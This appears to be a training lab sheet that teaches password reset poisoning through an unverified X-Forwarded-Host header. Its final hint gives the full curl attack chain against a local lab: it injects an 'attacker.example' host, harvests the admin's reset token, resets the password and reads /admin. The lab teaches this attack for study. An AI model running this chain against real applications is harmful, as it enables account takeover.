# Lab 11 — Password reset poisoning via middleware

**Difficulty:** ★★ Practitioner
**Goal:** log in as `administrator` and read the flag from `/admin`
**You have:** a working account `wiener` / `peter`
**You also have:** an attacker server at **`/webhook`** (the offline stand-in
for your own webhook — anything that clicks a poisoned link reports there)

The reset email says "click this link". Where does that link's hostname
come from? The application sits behind middleware that passes through
`X-Forwarded-Host` — and uses it, unverified, when building the recovery
URL. Point the link at your host, and the token travels to you.

## Hint ladder

**Hint 1 (stuck):** Request a reset for the administrator and compare the
link in the email when you send `X-Forwarded-Host: attacker.example` vs
when you don't. What is the email's URL built from? Where does the
poisoned click "land"?

**Hint 2 (still stuck):** The app builds the link as
`http://<host-from-header>/forgot-password?token=…`. A real victim clicking
that would ship the token to your server — here the app simulates the
click into `/webhook`. Read your webhook inbox: the token is sitting
there next to the hostname you injected.

**Hint 3 (last rung — the actual attack):**
```bash
curl -s -H 'X-Forwarded-Host: attacker.example' -d 'username=administrator' http://127.0.0.1:8111/forgot-password
curl -s http://127.0.0.1:8111/webhook        # token for administrator
curl -s -d "token=<that token>&username=administrator&new-password=Pwn3d!" http://127.0.0.1:8111/forgot-password
curl -s -c jar -d 'username=administrator&password=Pwn3d!' http://127.0.0.1:8111/login
curl -s -b jar http://127.0.0.1:8111/admin
```
The header changed where the link pointed; the click leaked the token; the
token reset the admin's password. That's the whole chain.

## Reset

```bash
docker compose restart lab11-password-reset-poisoning
```